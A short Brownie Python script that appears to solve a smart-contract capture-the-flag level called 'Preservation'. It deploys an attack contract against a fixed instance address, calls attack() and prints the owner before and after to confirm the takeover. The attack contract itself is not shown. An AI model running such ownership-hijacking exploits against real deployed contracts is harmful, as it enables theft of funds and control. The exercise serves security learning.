from brownie import config, network, accounts, Preservation, PreservationATK

def main():
    player = accounts.add(config["wallets"]["from_key"]) 

    instanceAddress = "0x827D1894966308c13B8f480e8C3349dDe6e62822"

    preservation = Preservation.at(instanceAddress)
    preservationATK = PreservationATK.deploy(instanceAddress, {"from":player})
    print(f"current owner is : {preservation.owner()}")
    print(f"Lib1 addr is : {preservation.timeZone1Library()}")
    preservationATK.attack({"from":player})
    print(f"current owner is : {preservation.owner()}")
    print(f"Lib1 addr is : {preservation.timeZone1Library()}")
